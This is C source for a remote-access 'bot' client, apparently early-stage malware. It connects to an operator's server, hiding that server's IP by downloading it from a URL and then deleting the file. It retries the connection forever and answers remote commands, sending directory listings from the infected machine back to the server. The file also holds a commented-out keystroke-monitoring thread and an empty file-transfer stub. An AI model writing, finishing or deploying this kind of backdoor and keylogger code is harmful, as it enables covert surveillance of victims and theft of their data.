#include "bot.h"

int main( int argc, const char **argv ) {
    int len;
    int ntoks;
    int pcode;
    int nbytes;
    char *option;
    char *tokens[0xFF];
    char erbuf[0xFF];
    struct option opt, *vopt = &opt;
    struct sockaddr_in serv_addr;
    struct timeval timeout;
    char *ip, *port;
    pthread_t kstrd;
    
    if ( argc != 0x2 ) {
        fprintf( stdout, "usage: %s --ip=<ip:port>\n", *argv );
        fprintf( stdout, "usage: %s --url=<url to download txt file containing server ip>\n", *argv );
        return -1;
    }

    /* url format must be `http://host:port/path` or `http://host:port/` [NO HTTPS!!!!] */
    /* without the port included in the url or without the `http://` scheme the download won't work!!! */
    option = (char *) *++argv;
    len    = strlen( option );
    vopt->key   = optname( option );
    vopt->value = optvalue( option );

    int _sock = socket( AF_INET, SOCK_STREAM, 0x00 );
    if ( _sock == -1 ) {
        fprintf( stderr, "[Error][%s] - %s", __FILE__, strerror( errno ) );
        return -1;
    }

    int _opt = 1;
    timeout.tv_sec  = 5;
    timeout.tv_usec = 0;
    int _sop1 = setsockopt( _sock, SOL_SOCKET, SO_REUSEADDR, &_opt, sizeof( _opt ) );
    int _sop2 = setsockopt( _sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout) );
    if ( _sop1 == -1 ) {
        fprintf( stderr, "[Error][%s] - %s", __FILE__, strerror( errno ) );
        return -1;
    }

    if ( strcmp( vopt->key, "--ip" ) == 0 ) {
        int rcode = split_string( vopt->value, strlen( vopt->value ), ":", tokens, &ntoks, erbuf );

        if ( rcode == 0 ) {
            ip   = (char *) malloc( 20 * sizeof( char ) );
            port = (char *) malloc( 10 * sizeof( char ) );
            memcpy( ip, trim( *tokens, strlen( *tokens ) ), strlen( *tokens ) + 1 );
            memcpy( port, trim( *(tokens + 1), strlen( *(tokens + 1) ) ), strlen( *(tokens + 1) ) + 1 );
        }
    } 
    else if ( strcmp( vopt->key, "--url" ) == 0 ) {
        /* this option is used if you dont want your ip to be hardcoded directly */
        /* download the contents of the ip file and store them in `botTIo.txt` file */
        /* format of the contents of the ip file must be `ip:port` */
        char *fpath = (getenv( "HOME" ) == NULL) ? "/tmp/botTIo.txt" : strcat(getenv( "HOME" ), "/botTIo.txt") ;
        int d_stat  = download_ip_file( vopt->value, fpath );

        if ( d_stat == 0 ) {
            ip    = (char *) malloc( 20 * sizeof( char ) );
            port  = (char *) malloc( 10 * sizeof( char ) );
            pcode = parse_ip_file( fpath, ip, port );
            /* remove the file as soon as we get its contents */
            unlink( fpath );
        } else {
            fprintf( stderr, "[Error][%s] - File download error!\n", __FILE__ );
            return -1;
        }
    }
    
    memset( &serv_addr, '0', sizeof( serv_addr ) );
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons( atoi( port ) );

    if ( inet_pton( AF_INET, ip, &serv_addr.sin_addr ) <= 0 ) {
        fprintf( stderr, "[Error][%s] - IP format is invalid!\n", __FILE__ );
        return -1;
    }

   int _cn = connect( _sock, (struct sockaddr *)&serv_addr, sizeof( serv_addr ) );
    if ( _cn == -1 ) {
        retry_connect(_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr),10);
    }

    /* commands handling starts here */
    int num_entries;
    char rc_buff[BUFSIZ];
    char fname[1024];
    char dirname[1024];
    char ferrbuf[0xFF];
    char sbuf[0x88b8]; /* 35000 */
    struct scdirs entries[5000];

    while ( 1 ) {
        nbytes = recv( _sock, rc_buff, sizeof( rc_buff ), 0x00 );
        if ( nbytes > 0x00 ) {
            if ( strstr( rc_buff, fscan ) != NULL && get_cmd_param( rc_buff, dirname ) == 0 ) {
                if ( ftp_scandir( dirname, entries, ferrbuf, &num_entries ) != -1 ) {
                    for ( int i = 0 ; i < num_entries ; i++ ) {
                        strcat( sbuf, entries[i].entryname );
                        free( entries[i].entryname );
                    }
                    send( _sock, sbuf, sizeof( sbuf ), 0x00 );
                } else {
                    strcat( ferrbuf, " [E]" );
                    send( _sock, ferrbuf, sizeof( ferrbuf ), 0x00 );
                }
            }
            memset( rc_buff, '\x00', sizeof( rc_buff ) );
            memset( sbuf, '\x00', sizeof( sbuf ) );
            memset( dirname, '\x00', sizeof( dirname ) );
            memset( ferrbuf, '\x00', sizeof( ferrbuf ) );
        }
    }
    /* after successfull connection start the keystroke thread */
    /*int *zsock = &_sock;
    int _rc = pthread_create( &kstrd, NULL, key_monitor_start, (void *) zsock );
    if ( !_rc ) {
        pthread_join( kstrd, NULL );
    }*/
    free( ip ); free( port );

    return 0;
}

int retry_connect( int sock, const struct sockaddr *addr, socklen_t len, int delay ) {
    while ( 1 ) {
        sleep( delay );
        if ( connect( sock, addr, len ) == 0 ) {
            fprintf( stdout, "connected to server\n" );
            return 0;
        }
        fprintf( stdout, "connection fffaileddd...\n" );
    }
    return -1;
}

int ftp_scandir( const char *dirname, struct scdirs *entries, char *errbuf, int *num_entries ) {
    int nobjs;
    struct dirent **nlist;

    if ( strcmp( dirname, "" ) == 0 ) {
        strcpy( errbuf, strerror( ENOENT ) );
        return -1;
    }
    nobjs = scandir( dirname, &nlist, NULL, alphasort );
    if ( nobjs == -1 ) {
        strcpy( errbuf, strerror( errno ) );
        return -1;
    }
    *num_entries = nobjs;
    while ( nobjs-- ) {
        entries[nobjs].entryname = (char *) malloc( 0xFF * sizeof( char ) );
        memcpy( entries[nobjs].entryname, nlist[nobjs]->d_name, strlen( nlist[nobjs]->d_name ) + 1 );
        strcat( entries[nobjs].entryname, "\n" );
        free( nlist[nobjs] );
    }
    free( nlist ), errbuf = NULL; return 0;
}

int ftp_transfer_file( int sock, char *fname ) {
    
}

int get_cmd_param( const char *cmd, char *param ) {
    int pstart, i, j;
    char *ccmd = (char *) cmd;
    
    if ( !cmd ) {
        strcpy( param, "" );
        return 0;
    }
    if ( strstr( ccmd, " " ) == NULL ) {
        strcpy( param, "" );
        return 0;
    }
    pstart = strpos( ccmd, " " );
    for ( i = pstart + 1, j = 0 ; *(ccmd + i) != '\x00' && *(ccmd + i) != '\x0a' ; i++ ) {
        param[j++] = *(ccmd + i);
    }
    param[j] = '\x00';
    return 0;
}

char * optname( const char *opt ) {
    int i = 0;
    int optname_end = strpos( opt, "=" );
    static char optname[10];

    if ( optname_end > 0 ) {
        while ( *opt != '=' ) { optname[i++] = *opt, opt++; }
        optname[i] = '\x00';
        return optname;
    }
    return NULL;
}

char * optvalue( const char *opt ) {
    int i, j = 0;
    int optname_end = strpos( opt, "=" );
    static char optvalue[1024];

    if ( optname_end > 0 ) {
        i = optname_end + 1, opt = opt + i;

        while ( *opt != '\x00' ) { optvalue[j++] = *opt++; }
        optvalue[j] = '\x00';
        return optvalue;
    }
    return NULL;
}

int parse_ip_file( const char *fname, char *ip, char *port ) {
    int c, p = 0;
    FILE *fp;

    if ( (fp = fopen( fname, "r" )) != NULL ) {
        while ( (c = getc( fp )) != EOF ) {
            if ( c == ':' ) {
                p = 1; continue; 
            }
            if ( !p ) { *ip++ = c; }
            if ( p )  { *port++ = c; }
        }
        *ip = '\x00', *port = '\x00'; return ( !p ) ? -1 : 0 ;
    }
    return -1;
}

int is_file( const char *fname ) {
    struct stat ffstat;
    if ( stat( fname, &ffstat ) < 0x00 ) {
        return -1;
    }
    return (S_ISREG( ffstat.st_mode )) ? 0 : -1 ;
}